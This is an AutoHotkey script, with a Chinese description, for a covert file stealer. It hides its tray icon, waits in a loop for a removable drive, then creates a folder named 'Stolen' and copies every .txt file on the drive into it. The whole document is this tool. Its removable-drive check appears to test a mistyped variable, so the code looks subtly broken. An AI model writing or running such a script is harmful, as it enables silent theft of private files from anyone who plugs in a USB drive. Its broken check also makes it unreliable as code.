#NoTrayIcon

MsgBox 启动时图标隐藏，持续运行，当有可移动存储介质插入时，创建名为Stolen的文件夹，拷贝前者的根目录及子目录下所有txt文件到Stolen下并结束程序
loop{
	DriveGet, list, List
	loop,Parse,List
	{
		folder:=A_LoopField . ":\"
		DriveGet, cap, Capacity, %folder%
		DriveSpaceFree, free, %folder%
		DriveGet, fs, fs, %folder%
		DriveGet, label, label, %folder%
		DriveGet, serial, serial, %folder%
		DriveGet, type, type, %folder%
		DriveGet, status, status, %folder%
		if(Drive Type=="Removable")
		{
			FileCreateDir, .\Stolen\
			FileCopy, %folder%\*.txt, .\Stolen\
			loop, %folder%\*, 2, 1
			{
				; MsgBox %A_LoopFileFullPath%
				FileCopy, %A_LoopFileFullPath%\*.txt, .\Stolen\
			}
			ExitApp
		}
	}
}

::stop::
ExitApp